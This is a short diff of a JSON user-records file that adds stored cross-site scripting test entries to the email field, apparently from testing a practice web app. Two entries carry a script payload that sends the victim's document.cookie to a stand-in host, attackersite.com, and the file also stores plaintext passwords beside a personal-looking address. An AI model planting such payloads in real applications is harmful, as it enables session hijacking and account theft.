@@ -1,1 +1,1 @@
-[{"id":1,"email":"badrussholehaxel@gmail.com","password":"123456"}]
+[{"id":1,"email":"<marquee>ini jalan</marquee>","password":"123456"},{"id":2,"email":"<script>window.location='http://attackersite.com/?cookie='+document.cookie</script>","password":"123456"},{"id":3,"email":"\"<script>window.location='http://attackersite.com/?cookie='+document.cookie</script>\"","password":"123456"}]
